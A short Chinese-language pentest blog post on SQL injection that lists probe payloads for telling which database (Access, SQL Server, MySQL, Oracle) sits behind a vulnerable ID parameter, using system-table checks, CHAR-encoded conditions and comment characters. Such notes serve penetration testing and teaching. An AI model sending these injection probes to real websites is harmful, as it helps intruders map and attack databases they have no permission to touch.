+++
date = "2016-06-19T22:15:52+08:00"
description = ""
draft = false
tags = ["injection"]
title = "SQL注入之判断数据库类型"
topics = ["Pentest"]

+++

### 0x00 常见手段
扫描端口、指纹、抓包查看http头信息、在网址后面直接判断

### 0x01 根据各数据库特有函数判断
* Access:
```
and (select count(*) from MSysAccessObjects)>0   返回正常说明是access
and exists(select count(*) from表)
ID=1 and (select count (*) from sysobjects)>0 返回异常
ID=1 and (select count (*) from msysobjects)>0返回异常
```

* SQLServer:
```
and (select count(*) from sysobjects) >0   返回正常说明是mssql
ID=1 and (select count (*) from sysobjects)>0 返回正常
ID=1 and (select count (*) from msysobjects)>0返回异常
ID=1 and left(version(),1)=5%23  //红色字体也可能是4
ID=1 and exists(select id from sysobjects)
ID=1 and len(user)>0 
ID=1 CHAR(97)+CHAR(110)+CHAR(100)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)
```

* MySQL:
```
and length(user())>0   返回正常说明是MySQL
id=2 and version()>0 返回正常
id=2 and length(user())>0
id=2 CHAR(97, 110, 100, 32, 49, 61, 49)
```

* ORACLE:
```
ID=1  and '1'||'1’='11'
ID=1  and 0<>(select count(*) from dual) 
ID=1 CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49)
```

### 0x02 其他方法
```
"/*"是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符：
"--"是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：
";"是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。
```
